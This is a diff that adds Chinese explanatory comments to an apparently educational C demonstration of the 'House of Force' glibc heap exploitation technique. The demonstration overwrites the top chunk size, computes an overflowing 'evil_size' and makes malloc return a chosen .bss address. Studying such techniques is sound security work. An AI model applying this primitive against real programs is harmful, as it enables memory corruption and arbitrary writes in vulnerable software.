@@ -46,7 +46,7 @@ int main(int argc , char* argv[])
 
 	printf("\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
 	printf("Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
-	ptr_top[0] = -1;
+	ptr_top[0] = -1;  //降top chun设置无限大，分配的时候，会通过偏移相加，进行计算，返回内存地址，不会mmap
 	printf("New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
 	//------------------------
 
@@ -54,13 +54,14 @@ int main(int argc , char* argv[])
 	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
 	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
 
-	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
+	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;  //构造一个溢出的数，让top溢出到指定地址
+	                                                                                 //相当于减去差值，多减8个自己是因为，chun 头，需要8字节
 	printf("\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
 	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
-	void *new_ptr = malloc(evil_size);
+	void *new_ptr = malloc(evil_size);       //第一次申请，让top溢出到制定的位置
 	printf("As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);
 
-	void* ctr_chunk = malloc(100);
+	void* ctr_chunk = malloc(100);        //第二次申请，返回的就是bss_var的地址
 	printf("\nNow, the next chunk we overwrite will point at our target buffer.\n");
 	printf("malloc(100) => %p!\n", ctr_chunk);
 	printf("Now, we can finally overwrite that value:\n");
